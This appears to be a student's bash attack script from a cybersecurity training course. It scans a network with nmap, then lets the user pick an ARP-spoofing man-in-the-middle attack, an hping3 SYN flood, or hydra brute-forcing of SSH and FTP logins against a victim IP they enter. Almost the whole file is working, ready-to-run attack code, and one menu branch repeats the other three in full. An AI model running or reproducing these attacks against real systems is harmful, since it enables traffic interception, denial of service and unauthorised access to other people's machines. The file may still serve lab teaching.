#!/bin/bash
#Please run this script with sudo/root permission
#CFC011023 Group 2, S15 Ng Jing Ren, Trainer: Ryan Tan

echo '# Welcome to attack script.'

echo ' '

function NetworkScan ()
{
	#Allow user to scan for a network
	echo '# Please specify a network to scan. (Please include /24 at the end of IP)'
	echo '# Example of IP: 192.168.178.0/24'
	read scanIP
	
	if [[ -z $scanIP ]];
		then
			echo '# Network is required, script is exiting.'
			exit
		else
			echo "# "$scanIP" is input."
		fi

		NetScan=$(sudo nmap -sn "$scanIP")
}
NetworkScan

#Displaying the result of Network Scan
echo '# Result of Network Scan:'
echo "$NetScan"
echo ' '

function Selection ()
{
	echo '# Please select an option to attack: (A) Arpspoof (B) Hping3 (C) Bruteforce (D) Random'
	read options
	
	case $options in 
	A|a) 
		echo '# Arpspoof attack is selected.'
		
		#Brief description of Arpspoof attack
		echo '# Arpspoof is a type of attack where the attacker uses ARP to send out fake messages to trick other devices into believing 'they\''re communicating with someone else. This allows the attacker to intercept, modify, or redirect network traffic for malicious purposes, such as eavesdropping or stealing sensitive information.'
		
		#Check if Arpspoof application is installed
		function DsniffChecker ()
		{
			if [[ $(command -v dsniff) ]] 
			
			then
				echo '# Dsniff is already installed.'
			
			else
				sudo apt-get update
				sudo updatedb
				sudo apt-get install dsniff -y
				echo '# Dsniff is installed.'
			fi
		}
		DsniffChecker
		
		echo ' '
		
		function ArpspoofAttack ()
		{
			#Allowing IP forwarding
			sudo bash -c 'echo 1 > /proc/sys/net/ipv4/ip_forward'
			if [[ $(sudo cat /proc/sys/net/ipv4/ip_forward) == '1' ]]
			then
				echo '# IP Forwarding is active.'
			fi
			
			#Allow the user to enter details for Arpspoof attack	
			#Entering the victim's IP address
			echo '# Please enter the 'victim\''s IP address.'
			read victimIP
			
			if [[ -z $victimIP ]];
			then
				echo '# Please enter an IP address, script is exiting.'
				exit
			else	
				echo "# "$victimIP" is input."
			fi
			
			#Entering the default gateway IP address
			echo '# Please enter the default gateway IP address.'
			read defaultIP
			
			if [[ -z $defaultIP ]];
			then
				echo '# Please enter an IP address, script is exiting.'
				exit
			else	
				echo "# "$defaultIP" is input."
			fi
			
			echo ' '
			
			#Saving an attack entry log in /var/log
			TDATE=$(date)
			echo ""$TDATE" - # Arpspoof Attack, Victim IP: "$victimIP", Default gateway: "$defaultIP", file saved in /var/log/attack.log" >> /var/log/attack.log
			echo ""$TDATE" - # Arpspoof Attack, Victim IP: "$victimIP", Default gateway: "$defaultIP", file saved in /var/log/attack.log"
			
			#Launching an Arpspoof attack by first informing the victim's computer that I am the router, followed by informing the victim's router that I am the victim.
			sudo timeout 30 arpspoof -t "$victimIP" "$defaultIP" & sudo timeout 30 arpspoof -t "$defaultIP" "$victimIP" 
			echo '# Arpspoof Attack is completed.'
			
		}
		ArpspoofAttack
	;;
	
	B|b)
		echo '# Hping3 attack is selected.'
		
		#Brief description of Hping3 attack
		echo '# Hping3 is a Denial of Service (DoS) attack used to overwhelm a machine or network by sending a large number of requests to prevent legitimate users from accessing it.'
		
		#Check if Hping3 application is installed
		function Hping3Checker ()
		{
			if [[ $(command -v hping3) ]] 
			
			then
				echo '# Hping3 is already installed.'
			
			else
				sudo apt-get update
				sudo updatedb
				sudo apt-get install hping3 -y
				echo '# Hping3 is installed.'
			fi
		}
		Hping3Checker
		
		function Hping3Attack ()
		{
			#Allow the user to enter details for Hping3 attack	
			#Entering the victim's IP address
			echo '# Please enter the 'victim\''s IP address.'
			read victimIP
			
			if [[ -z $victimIP ]];
			then
				echo '# Please enter an IP address, script is exiting.'
				exit
			else	
				echo "# "$victimIP" is input."
			fi
			
			#Entering the victim's port number
			echo '# Please enter a port number to attack.'
			read portnum
			
			if [[ -z $portnum ]];
			then
				echo '# Please enter a port number, script is exiting.'
				exit
			else	
				echo "# "$portnum" is input."
			fi
			echo ' '
			
			#Saving an attack entry log in /var/log
			TDATE=$(date)
			echo ""$TDATE" - # Hping3 Attack launched at Victim IP: "$victimIP" using port "$portnum", file saved in /var/log/attack.log" >> /var/log/attack.log
			echo ""$TDATE" - # Hping3 Attack launched at Victim IP: "$victimIP" using port "$portnum", file saved in /var/log/attack.log"
			
			#Launching an Hping3 attack by sending out SYN packets to flood the victim, targeting port 80 with a data size of 120.
			sudo timeout 30 hping3 -S --flood -V -p "$portnum" -d 120 "$victimIP"
			echo '# Hping3 Attack is completed.'
		}
		Hping3Attack
		
	;;
	
	C|c)
		echo '# Bruteforce attack is selected.'
		echo '# A bruteforce attack is an attack that involves trial and error with different combinations of usernames and passwords to gain access into the system.'
		
		function Bruteforce()
			{
				#Allow the user to enter details for Bruteforce attack	
				#Entering the victim's IP address
				echo '# Please enter the 'victim\''s IP address.'
				read victimIP
				
				if [[ -z $victimIP ]];
				then
					echo '# Please enter an IP address, script is exiting.'
					exit
				else	
					echo "# "$victimIP" is input."
				fi
				
				#User needs to input a username to bruteforce as part of the script requirement.
				echo '# Please type in an username (Do not upload a file).'
				read user
				
				#If user did not provide username, script exits on itself.
				if [[ -z $user ]];
				then
					echo '# Username is required, script is exiting.'
					exit
				else
					echo '# Username is input.'
				fi
				echo ' '
				
				#Only allow user to upload file, if no file is being selected it will use default password list.
				echo '# Please upload a password file if you want to, if no file please hit enter.'
				read passfile
			
				if [ -f "$passfile" ];
				then
					
					TDATE=$(date)
					echo ""$TDATE" - # Bruteforce Attack launched at Victim IP: "$victimIP" using SSH and FTP with the username as "$user". The file is saved in /var/log/attack.log" >> /var/log/attack.log
					echo ""$TDATE" - # Bruteforce Attack launched at Victim IP: "$victimIP" using SSH and FTP with the username as "$user". The file is saved in /var/log/attack.log"
					
					#Using hydra to bruteforce ssh
					hydra -l "$user" -P "$passfile" "$victimIP" ssh -vV -f
					echo '# SSH Bruteforce attack is completed.'
					
					#Using hydra to bruteforce ftp
					hydra -l "$user" -P "$passfile" "$victimIP" ftp -vV -f
					echo '# FTP Bruteforce attack is completed.'
					
					echo '# Bruteforce attack is completed.'
				else
					echo '# No password file is input.'
					
					#Using built-in password list by john
					defaultpass=/usr/share/wordlists/john.lst
					
					TDATE=$(date)
					echo ""$TDATE" - # Bruteforce Attack launched at Victim IP: "$victimIP" using SSH and FTP with the username as "$user". The file is saved in /var/log/attack.log" >> /var/log/attack.log
					echo ""$TDATE" - # Bruteforce Attack launched at Victim IP: "$victimIP" using SSH and FTP with the username as "$user". The file is saved in /var/log/attack.log"
					
					#Using hydra to bruteforce ssh
					hydra -l "$user" -P "$defaultpass" "$victimIP" ssh -vV -f
					echo '# SSH Bruteforce attack is completed.'
					
					#Using hydra to bruteforce ftp
					hydra -l "$user" -P "$defaultpass" "$victimIP" ftp -vV -f
					echo '# FTP Bruteforce attack is completed.'
					
					echo '# Bruteforce attack is completed.'
				fi
			}
			Bruteforce
	;;
	
	D|d)
		echo '# Random attack is selected.'
		
		#Using shuf command to randomize the options
		options=$(shuf -e -n1 'A' 'B' 'C' 'a' 'b' 'c')
		
		case $options in
			A|a) 
			echo '# Arpspoof attack is selected.'
		
			#Brief description of Arpspoof attack
			echo '# Arpspoof is a type of attack where the attacker uses ARP to send out fake messages to trick other devices into believing 'they\''re communicating with someone else. This allows the attacker to intercept, modify, or redirect network traffic for malicious purposes, such as eavesdropping or stealing sensitive information.'
		
			#Check if Arpspoof application is installed
			function DsniffChecker ()
			{
			if [[ $(command -v dsniff) ]] 
			
			then
				echo '# Dsniff is already installed.'
			
			else
				sudo apt-get update
				sudo updatedb
				sudo apt-get install dsniff -y
				echo '# Dsniff is installed.'
			fi
			}
			DsniffChecker
		
			echo ' '
		
			function ArpspoofAttack ()
			{
				#Allowing IP forwarding
				sudo bash -c 'echo 1 > /proc/sys/net/ipv4/ip_forward'
				if [[ $(sudo cat /proc/sys/net/ipv4/ip_forward) == '1' ]]
				then
					echo '# IP Forwarding is active.'
				fi
			
				#Allow the user to enter details for Arpspoof attack	
				#Entering the victim's IP address
				echo '# Please enter the 'victim\''s IP address.'
				read victimIP
			
				if [[ -z $victimIP ]];
				then
					echo '# Please enter an IP address, script is exiting.'
					exit
				else	
					echo "# "$victimIP" is input."
				fi
			
				#Entering the default gateway IP address
				echo '# Please enter the default gateway IP address.'
				read defaultIP
			
				if [[ -z $defaultIP ]];
				then
					echo '# Please enter an IP address, script is exiting.'
					exit
				else	
					echo "# "$defaultIP" is input."
				fi
			
				echo ' '
			
				#Saving an attack entry log in /var/log
				TDATE=$(date)
				echo ""$TDATE" - # Arpspoof Attack, Victim IP: "$victimIP", Default gateway: "$defaultIP", file saved in /var/log/attack.log" >> /var/log/attack.log
				echo ""$TDATE" - # Arpspoof Attack, Victim IP: "$victimIP", Default gateway: "$defaultIP", file saved in /var/log/attack.log"
				
				#Launching an Arpspoof attack by first informing the victim's computer that I am the router, followed by informing the victim's router that I am the victim.
				sudo timeout 30 arpspoof -t "$victimIP" "$defaultIP" & sudo timeout 30 arpspoof -t "$defaultIP" "$victimIP" 
				echo '# Arpspoof Attack is completed.'
				
			}
			ArpspoofAttack
			;;
		
			B|b)
				echo '# Hping3 attack is selected.'
				
				#Brief description of Hping3 attack
				echo '# Hping3 is a Denial of Service (DoS) attack used to overwhelm a machine or network by sending a large number of requests to prevent legitimate users from accessing it.'
				
				#Check if Hping3 application is installed
				function Hping3Checker ()
				{
					if [[ $(command -v hping3) ]] 
					
					then
						echo '# Hping3 is already installed.'
					
					else
						sudo apt-get update
						sudo updatedb
						sudo apt-get install hping3 -y
						echo '# Hping3 is installed.'
					fi
				}
				Hping3Checker
				
				function Hping3Attack ()
				{
					#Allow the user to enter details for Hping3 attack	
					#Entering the victim's IP address
					echo '# Please enter the 'victim\''s IP address.'
					read victimIP
					
					if [[ -z $victimIP ]];
					then
						echo '# Please enter an IP address, script is exiting.'
						exit
					else	
						echo "# "$victimIP" is input."
					fi
					
					#Entering the victim's port number
					echo '# Please enter a port number to attack.'
					read portnum
					
					if [[ -z $portnum ]];
					then
						echo '# Please enter a port number, script is exiting.'
						exit
					else	
						echo "# "$portnum" is input."
					fi
					echo ' '
					
					#Saving an attack entry log in /var/log
					TDATE=$(date)
					echo ""$TDATE" - # Hping3 Attack launched at Victim IP: "$victimIP" using port "$portnum", file saved in /var/log/attack.log" >> /var/log/attack.log
					echo ""$TDATE" - # Hping3 Attack launched at Victim IP: "$victimIP" using port "$portnum", file saved in /var/log/attack.log"
					
					#Launching an Hping3 attack by sending out SYN packets to flood the victim, targeting port 80 with a data size of 120.
					sudo timeout 30 hping3 -S --flood -V -p "$portnum" -d 120 "$victimIP"
					echo '# Hping3 Attack is completed.'
				}
				Hping3Attack
				
			;;
			
			C|c)
				echo '# Bruteforce attack is selected.'
				echo '# A bruteforce attack is an attack that involves trial and error with different combinations of usernames and passwords to gain access into the system.'
		
				function Bruteforce()
					{
						#Allow the user to enter details for Bruteforce attack	
						#Entering the victim's IP address
						echo '# Please enter the 'victim\''s IP address.'
						read victimIP
						
						if [[ -z $victimIP ]];
						then
							echo '# Please enter an IP address, script is exiting.'
							exit
						else	
							echo "# "$victimIP" is input."
						fi
						
						#User needs to input a username to bruteforce as part of the script requirement.
						echo '# Please type in an username (Do not upload a file).'
						read user
						
						#If user did not provide username, script exits on itself.
						if [[ -z $user ]];
						then
							echo '# Username is required, script is exiting.'
							exit
						else
							echo '# Username is input.'
						fi
						echo ' '
						
						#Only allow user to upload file, if no file is being selected it will use default password list.
						echo '# Please upload a password file if you want to, if no file please hit enter.'
						read passfile
					
						if [ -f "$passfile" ];
						then
							
							TDATE=$(date)
							echo ""$TDATE" - # Bruteforce Attack launched at Victim IP: "$victimIP" using SSH and FTP with the username as "$user". The file is saved in /var/log/attack.log" >> /var/log/attack.log
							echo ""$TDATE" - # Bruteforce Attack launched at Victim IP: "$victimIP" using SSH and FTP with the username as "$user". The file is saved in /var/log/attack.log"
							
							#Using hydra to bruteforce ssh
							hydra -l "$user" -P "$passfile" "$victimIP" ssh -vV -f
							echo '# SSH Bruteforce attack is completed.'
							
							#Using hydra to bruteforce ftp
							hydra -l "$user" -P "$passfile" "$victimIP" ftp -vV -f
							echo '# FTP Bruteforce attack is completed.'
							
							echo '# Bruteforce attack is completed.'
						else
							echo '# No password file is input.'
							
							#Using built-in password list by john
							defaultpass=/usr/share/wordlists/john.lst
							
							TDATE=$(date)
							echo ""$TDATE" - # Bruteforce Attack launched at Victim IP: "$victimIP" using SSH and FTP with the username as "$user". The file is saved in /var/log/attack.log" >> /var/log/attack.log
							echo ""$TDATE" - # Bruteforce Attack launched at Victim IP: "$victimIP" using SSH and FTP with the username as "$user". The file is saved in /var/log/attack.log"
							
							#Using hydra to bruteforce ssh
							hydra -l "$user" -P "$defaultpass" "$victimIP" ssh -vV -f
							echo '# SSH Bruteforce attack is completed.'
							
							#Using hydra to bruteforce ftp
							hydra -l "$user" -P "$defaultpass" "$victimIP" ftp -vV -f
							echo '# FTP Bruteforce attack is completed.'
							
							echo '# Bruteforce attack is completed.'
						fi
					}
					Bruteforce
			;;
			esac
	;;
	
	*)
		echo '# This is not a valid selection. Script is exiting.'
		exit
	;;
	esac
}
Selection

